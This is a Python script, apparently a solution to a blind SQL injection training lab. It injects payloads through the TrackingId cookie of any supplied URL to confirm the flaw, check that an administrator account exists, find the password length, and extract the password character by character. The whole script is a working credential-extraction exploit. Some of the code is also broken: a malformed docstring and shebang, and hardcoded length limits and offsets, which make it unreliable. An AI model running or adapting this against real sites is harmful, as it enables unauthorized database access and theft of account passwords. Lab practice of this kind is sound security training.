#!/usr/bin python3

''''
Script created to solve the first lab of the blind SQL injection learning section.

Usage:
python3 blind.py -u <url> 
or
python3 blind.py --url <url>
''''

import requests
import sys
import argparse

s = requests.session()

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="Type url")
    options = parser.parse_args()
    if not options.url:
        parser.error("Plese type url (--help for Help)")
    return options

def check_results(url):
    payload = "x'+OR+1=1--"
    cookies = s.cookies.set('TrackingId', None)
    cookies = s.cookies.set('TrackingId', payload)
    body = s.get(url).content
    check = True

    while check:
        if "Welcome back" in body.decode():
            check = False
        else:
            print("False")
            sys.exit()

    payload = "x'+OR+1=2--"
    cookies = s.cookies.set('TrackingId', None)
    cookies = s.cookies.set('TrackingId', payload)
    body = s.get(url).content
    check = True

    while check:
        if "Welcome back" not in body.decode():
            check = False
        else:
            print("False")
            sys.exit()

    print("Possible Blind SQL injection!")

def confirm_admin(url):
    payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--"
    cookies = s.cookies.set('TrackingId', None)
    cookies = s.cookies.set('TrackingId', payload)
    body = s.get(url).content

    if "Welcome back" in body.decode():
        print("Administrator account exists!")
    else:
        print("False")
        sys.exit()

def passwd_len(url):
    payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>"
    lenght = range(1,10)
    for num in lenght:
        inject = payload + str(num) + "--"
        cookies = s.cookies.set('TrackingId', None)
        cookies = s.cookies.set('TrackingId', inject)
        body = s.get(url).content

        if "Welcome back" not in body.decode():
            print(f"Password has {num} characters")
            break

def get_passwd(url):
    payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--"
    lenght = range(1,7)
    char = "abcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
    passwd = []
    for l in lenght:
        for c in char:
            p = list(payload)
            p[85] = str(l)
            p[91] = c
            inject = "".join(p)
            cookies = s.cookies.set('TrackingId', None)
            cookies = s.cookies.set('TrackingId', inject)
            body = s.get(url).content

            if "Welcome back" in body.decode():
                passwd.append(c)
                break

    passwd = "".join(passwd)
    print(passwd)

options = get_arguments()
check_results(options.url)
confirm_admin(options.url)
passwd_len(options.url)
get_passwd(options.url)
